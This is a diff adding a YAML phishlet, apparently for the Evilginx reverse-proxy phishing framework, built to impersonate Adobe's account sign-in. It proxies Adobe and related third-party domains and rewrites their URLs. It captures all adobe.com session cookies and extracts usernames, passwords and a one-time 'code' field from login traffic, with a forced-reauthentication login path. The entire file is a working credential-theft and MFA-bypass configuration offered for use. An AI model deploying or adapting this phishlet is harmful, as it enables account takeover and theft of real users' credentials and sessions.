@@ -1,0 +1,101 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'auth.services', orig_sub: 'auth.services', domain: 'adobe.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'use', orig_sub: 'use', domain: 'typekit.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'recaptcha.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'adobe.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'p', orig_sub: 'p', domain: 'typekit.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'cookielaw.org', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'server.messaging', orig_sub: 'server.messaging', domain: 'adobe.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sstats', orig_sub: 'sstats', domain: 'adobe.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www1', orig_sub: 'www1', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'get', orig_sub: 'get', domain: 'adobe.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'adobedtm.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ims-na1', orig_sub: 'ims-na1', domain: 'adobelogin.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cc-collab', orig_sub: 'cc-collab', domain: 'adobe.io', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'pps.services', orig_sub: 'pps.services', domain: 'adobe.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'sc-static.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www2', orig_sub: 'www2', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'adobe-api', orig_sub: 'adobe-api', domain: 'arkoselabs.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'adobe.com', session: true, is_landing: false, auto_filter: false}
+  
+  - {phish_sub: 'geo', orig_sub: 'geo', domain: 'adobe.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cc-api-data', orig_sub: 'cc-api-data', domain: 'adobe.io', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'prod', orig_sub: 'prod', domain: 'adobeccstatic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ad', orig_sub: 'ad', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'adobeid-na1.services', orig_sub: 'adobeid-na1.services', domain: 'adobe.com', session: true, is_landing: false, auto_filter: false}
+  
+  - {phish_sub: 'auth-stg1.services', orig_sub: 'auth-stg1.services', domain: 'adobe.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'auth-ci-statics.dev.services', orig_sub: 'auth-ci-statics.dev.services', domain: 'adobe.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www3', orig_sub: 'www3', domain: 'gstatic.cn', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'odin', orig_sub: 'odin', domain: 'adobe.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'auth.services.adobe.com', orig_sub: 'auth.services', domain: 'adobe.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/signin/v2/tokens?credential=sso&checkReauth=false&puser=&t2Only=false&euid=&pbaPolicy=', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'use.typekit.net', orig_sub: 'use', domain: 'typekit.net', search: 'https://{hostname}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'recaptcha.net', orig_sub: '', domain: 'recaptcha.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'auth.services.adobe.com', orig_sub: '', domain: 'recaptcha.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'www.adobe.com', orig_sub: 'www', domain: 'adobe.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'auth.services.adobe.com', orig_sub: 'p', domain: 'typekit.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'cdn.cookielaw.org', orig_sub: 'cdn', domain: 'cookielaw.org', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}  
+  - {triggers_on: 'server.messaging.adobe.com', orig_sub: 'server.messaging', domain: 'adobe.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'sstats.adobe.com', orig_sub: 'sstats', domain: 'adobe.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'www1.gstatic.com', orig_sub: 'www1', domain: 'gstatic.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'auth.services.adobe.com', orig_sub: 'www1', domain: 'gstatic.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'get.adobe.com', orig_sub: 'get', domain: 'adobe.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'assets.adobedtm.com', orig_sub: 'assets', domain: 'adobedtm.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'ims-na1.adobelogin.com', orig_sub: 'ims-na1', domain: 'adobelogin.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'auth.services.adobe.com', orig_sub: 'ims-na1', domain: 'adobelogin.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'auth.services.adobe.com', orig_sub: 'ims-na1', domain: 'adobelogin.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+
+  - {triggers_on: 'cc-collab.adobe.io', orig_sub: 'cc-collab', domain: 'adobe.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: '', orig_sub: '', domain: 'sc-static.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'www2.googletagmanager.com', orig_sub: 'www2', domain: 'googletagmanager.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'adobe-api.arkoselabs.com', orig_sub: 'adobe-api', domain: 'arkoselabs.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'account.adobe.com', orig_sub: 'account', domain: 'adobe.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+
+  - {triggers_on: 'geo.adobe.com', orig_sub: 'geo', domain: 'adobe.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'cc-api-data.adobe.io', orig_sub: 'cc-api-data', domain: 'adobe.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'prod.adobeccstatic.com', orig_sub: 'prod', domain: 'adobeccstatic.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'ad.doubleclick.net', orig_sub: 'ad', domain: 'doubleclick.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'adobeid-na1.services.adobe.com', orig_sub: 'adobeid-na1.services', domain: 'adobe.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+
+  - {triggers_on: 'auth-stg1.services.services.adobe.com', orig_sub: 'auth-stg1.services', domain: 'adobe.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'auth-ci-statics.dev.services.services.adobe.com', orig_sub: 'auth-ci-statics.dev.services', domain: 'adobe.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'www3.gstatic.cn', orig_sub: 'www3', domain: 'gstatic.cn', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'odin.adobe.com', orig_sub: 'odin', domain: 'adobe.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+
+auth_tokens:
+  - domain: 'www.adobe.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.adobe.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'auth.services.adobe.com'
+    keys: ['.*,regexp']
+    type: 'cookie'  
+
+credentials:
+  username:  
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+  custom:
+    key: ''
+    search: '"code":"([^"]*)'
+    type: 'json'
+auth_urls:
+  - '/'
+
+login:
+  domain: 'auth.services.adobe.com'
+  path: '/en_US/deeplink.html?deeplink=ssofirst&callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2FSunbreakWebUI1%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Faccount.adobe.com%26state%3D%257B%2522jslibver%2522%253A%2522v2-v0.31.0-2-g1e8a8a8%2522%252C%2522nonce%2522%253A%25228278050422238117%2522%257D%26code_challenge_method%3Dplain%26use_ms_for_expiry%3Dtrue&client_id=SunbreakWebUI1&scope=AdobeID%2Copenid%2Cacct_mgmt_api%2Cgnav%2Cread_countries_regions%2Csocial.link%2Cunlink_social_account%2Cadditional_info.address.mail_to%2Cclient.scopes.read%2Cpublisher.read%2Cadditional_info.account_type%2Cadditional_info.roles%2Cadditional_info.social%2Cadditional_info.screen_name%2Cadditional_info.optionalAgreements%2Cadditional_info.secondary_email%2Cadditional_info.secondary_email_verified%2Cadditional_info.phonetic_name%2Cadditional_info.dob%2Cupdate_profile.all%2Csecurity_profile.read%2Csecurity_profile.update%2Cadmin_manage_user_consent%2Cadmin_slo%2Cpiip_write%2Cmps%2Clast_password_update%2Cupdate_email%2Cread_organizations%2Cuds_write%2Cuds_read%2Cfirefly_api%2Cpasskey_read%2Cpasskey_write%2Caccount_cluster.read%2Caccount_cluster.update%2Cadditional_info.authenticatingAccount%2Creauthenticated&state=%7B%22jslibver%22%3A%22v2-v0.31.0-2-g1e8a8a8%22%2C%22nonce%22%3A%228278050422238117%22%7D&relay=cb2bdd79-7dd8-4535-8e7f-c375e64df83f&locale=en_US&flow_type=token&idp_flow_type=login&reauthenticate=force&s_p=google%2Cfacebook%2Capple%2Cmicrosoft%2Cline%2Ckakao&response_type=token&code_challenge_method=plain&redirect_uri=https%3A%2F%2Faccount.adobe.com&use_ms_for_expiry=true#/'
+
+
